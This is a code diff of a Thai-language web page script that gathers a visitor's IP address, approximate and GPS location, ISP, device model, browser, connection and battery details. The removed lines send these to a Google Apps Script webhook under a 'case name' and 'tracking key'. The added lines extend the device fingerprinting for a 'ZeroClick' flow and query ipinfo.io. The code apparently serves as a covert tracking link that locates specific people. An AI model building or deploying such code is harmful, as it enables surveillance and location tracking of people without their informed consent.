-  if (caseName && caseName !== "ไม่มีค่า") {
-    message.push(`📂ชื่อเคส: ${caseName}`);
-  }
-  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
-  if (trackingKey && trackingKey !== "ไม่มีค่า") {
-    message.push(`🔑Tracking Key: ${trackingKey}`);
-  }
-  // --- ข้อมูล IP ละเอียด ---
-  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
-  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
-    message.push(`   - Hostname: ${ipData.hostname}`);
-  }
-  if (ipData.city && ipData.country) {
-    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
-    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
-  }
-  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
-    message.push(`   - พิกัด (IP): ${ipData.loc}`);
-  }
-  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
-    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
-  }
-  if (ipData.org && ipData.org !== "ไม่ทราบ") {
-    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
-  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
-    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
-  }
-  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
-    message.push(`   - Timezone: ${ipData.timezone}`);
-  }
-  // --- จบข้อมูล IP ---
+        // ฟังก์ชันดึงข้อมูลอุปกรณ์สำหรับส่งไปกับ ZeroClick
+        function getEnhancedDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceInfo = {
+                platform: "ไม่ทราบ",
+                browser: "ไม่ทราบ", 
+                deviceType: "ไม่ทราบ",
+                deviceModel: "ไม่ทราบ",
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                pixelRatio: window.devicePixelRatio || 1,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown',
+                connection: getConnectionInfo()
+            };
+            
+            // ระบบปฏิบัติการ (ละเอียดขึ้น)
+            if (/Windows NT 10\.0/.test(ua)) {
+                deviceInfo.platform = "Windows 10/11";
+            } else if (/Windows NT 6\.3/.test(ua)) {
+                deviceInfo.platform = "Windows 8.1";
+            } else if (/Windows NT 6\.2/.test(ua)) {
+                deviceInfo.platform = "Windows 8";
+            } else if (/Windows NT 6\.1/.test(ua)) {
+                deviceInfo.platform = "Windows 7";
+            } else if (/Windows NT 6\.0/.test(ua)) {
+                deviceInfo.platform = "Windows Vista";
+            } else if (/Windows NT 5\.1/.test(ua)) {
+                deviceInfo.platform = "Windows XP";
+            } else if (/Windows/.test(ua)) {
+                deviceInfo.platform = "Windows";
+            } else if (/Android ([0-9\.]+)/.test(ua)) {
+                deviceInfo.platform = "Android " + ua.match(/Android ([0-9\.]+)/)[1];
+            } else if (/iPhone|iPad|iPod/.test(ua)) {
+                const matches = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
+                const version = matches ? [matches[1], matches[2], matches[3] || 0].join('.') : "Unknown";
+                deviceInfo.platform = "iOS " + version;
+            } else if (/Mac OS X ([0-9_\.]+)/.test(ua)) {
+                const macVersion = ua.match(/Mac OS X ([0-9_\.]+)/)[1].replace(/_/g, '.');
+                deviceInfo.platform = "macOS " + macVersion;
+            } else if (/Linux/.test(ua)) {
+                deviceInfo.platform = "Linux";
+            } else if (/CrOS/.test(ua)) {
+                deviceInfo.platform = "Chrome OS";
+            }
+            
+            // ประเภทอุปกรณ์
+            if (/Mobile|Android/.test(ua) && !/iPad/.test(ua)) {
+                deviceInfo.deviceType = "มือถือ";
+            } else if (/iPad|Tablet/.test(ua)) {
+                deviceInfo.deviceType = "แท็บเล็ต";
+            } else {
+                deviceInfo.deviceType = "คอมพิวเตอร์";
+            }
+            
+            // เบราว์เซอร์ (ละเอียดขึ้น)
+            if (/Line/.test(ua)) {
+                deviceInfo.browser = "LINE " + (ua.match(/Line\/([0-9\.]+)/) ? ua.match(/Line\/([0-9\.]+)/)[1] : "");
+            } else if (/EdgA?\//.test(ua)) {
+                deviceInfo.browser = "Edge " + (ua.match(/EdgA?\/([0-9\.]+)/) ? ua.match(/EdgA?\/([0-9\.]+)/)[1] : "");
+            } else if (/Chrome\//.test(ua) && !/Chromium|Edge/.test(ua)) {
+                deviceInfo.browser = "Chrome " + (ua.match(/Chrome\/([0-9\.]+)/) ? ua.match(/Chrome\/([0-9\.]+)/)[1] : "");
+            } else if (/Firefox\//.test(ua)) {
+                deviceInfo.browser = "Firefox " + (ua.match(/Firefox\/([0-9\.]+)/) ? ua.match(/Firefox\/([0-9\.]+)/)[1] : "");
+            } else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) {
+                deviceInfo.browser = "Safari " + (ua.match(/Version\/([0-9\.]+)/) ? ua.match(/Version\/([0-9\.]+)/)[1] : "");
+            } else if (/MSIE|Trident/.test(ua)) {
+                deviceInfo.browser = "Internet Explorer " + (ua.match(/(?:MSIE |rv:)([0-9\.]+)/) ? ua.match(/(?:MSIE |rv:)([0-9\.]+)/)[1] : "");
+            }
+            
+            // รุ่นอุปกรณ์ (ละเอียดขึ้น)
+            if (/iPhone/.test(ua)) {
+                const matches = ua.match(/iPhone(?:\s+OS)?\s+([0-9_]+)/);
+                const versionStr = matches ? matches[1].replace(/_/g, '.') : "";
+                deviceInfo.deviceModel = `iPhone (iOS ${versionStr})`;
+            } else if (/iPad/.test(ua)) {
+                const matches = ua.match(/iPad(?:\s+OS)?\s+([0-9_]+)/);
+                const versionStr = matches ? matches[1].replace(/_/g, '.') : "";
+                deviceInfo.deviceModel = `iPad (iOS ${versionStr})`;
+            } else if (/Android/.test(ua)) {
+                // ดึงข้อมูล Android model
+                if (/samsung|SM-|Galaxy/i.test(ua)) {
+                    const model = ua.match(/SM-[A-Z0-9]+/i) || ua.match(/Galaxy\s[A-Z0-9\s]+/i);
+                    deviceInfo.deviceModel = model ? `Samsung ${model[0]}` : "Samsung Android";
+                } else if (/Pixel|Google/i.test(ua)) {
+                    const model = ua.match(/Pixel\s[0-9]+/i);
+                    deviceInfo.deviceModel = model ? `Google ${model[0]}` : "Google Pixel";
+                } else {
+                    const genericModel = ua.match(/Android.*?;\s([^;)]+)(?:\s+Build|\))/i);
+                    deviceInfo.deviceModel = genericModel ? genericModel[1].trim() : "Android Device";
+                }
+            }
+            
+            return deviceInfo;
+        }
 
-  // ข้อมูลพิกัด GPS (ถ้ามี)
-  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
-    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
-    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
-  } else {
-    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
-  }
+        // ฟังก์ชันดึงข้อมูลการเชื่อมต่อ
+        function getConnectionInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            
+            if (!connection) {
+                return {
+                    type: "unknown",
+                    effectiveType: "unknown",
+                    downlink: null,
+                    rtt: null
+                };
+            }
+            
+            return {
+                type: connection.type || "unknown",
+                effectiveType: connection.effectiveType || "unknown",
+                downlink: connection.downlink || null,
+                rtt: connection.rtt || null,
+                saveData: connection.saveData || false
+            };
+        }
 
-  // ข้อมูลอุปกรณ์
-  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
-  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);
-
-  // ข้อมูลหน้าจอ
-  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);
-
-  // ข้อมูลระบบ
-  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
-  message.push(`🔤ภาษา: ${deviceData.language}`);
-
-  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
-  if (typeof deviceData.connection === 'object') {
-    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
-    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
-    const networkType = deviceData.connection.networkType;
-    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
-    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);
-
-    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
-    if (deviceData.connection.isMobile && phoneInfo) {
-      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
-      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
-        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
-      }
-      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
-    }
-  }
-
-  // ข้อมูลแบตเตอรี่
-  if (typeof deviceData.battery === 'object') {
-    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
-  }
-
-  return message.join("\n");
-}
-
-// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
-function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbyCP9G1oMcmThZZdvr7JY0alrNw8eod8r9MBN0cKSiU-AwNTzLvTldOeg_rkUTMI6_b/exec';
-
-  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
-  if (!dataToSend.requestId) {
-    dataToSend.requestId = generateUniqueId();
-  }
-  
-  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
-  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
-  if (sentRequests.includes(dataToSend.requestId)) {
-    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
-    return;
-  }
-  
-  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");
-
-  // ส่งข้อมูล
-  fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(dataToSend),
-    mode: 'no-cors'
-  })
-  .then(() => {
-    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
-    
-    // บันทึก requestId ที่ส่งสำเร็จแล้ว
-    sentRequests.push(dataToSend.requestId);
-    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-  })
-  .catch(error => {
-    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
-  });
-}
-
-// สร้าง unique ID สำหรับแต่ละการร้องขอ1
-function generateUniqueId() {
-  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
-}
+        // ฟังก์ชันดึงข้อมูล IP ผ่าน API (ทำงานแบบ best-effort)
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipinfo.io/json', { timeout: 2000 });
+                if (!response.ok) {
+                    throw new Error(`Failed to fetch IP info: ${response.status}`);
+                }
+                return await response.json();
+            } catch (error) {
+                console.warn("Could not fetch IP info:", error);
+                return null; // ล้มเหลวแต่ไม่ทำให้โปรแกรมหยุดทำงาน
+            }
+        }
+    </script>
+</body>
+</html>
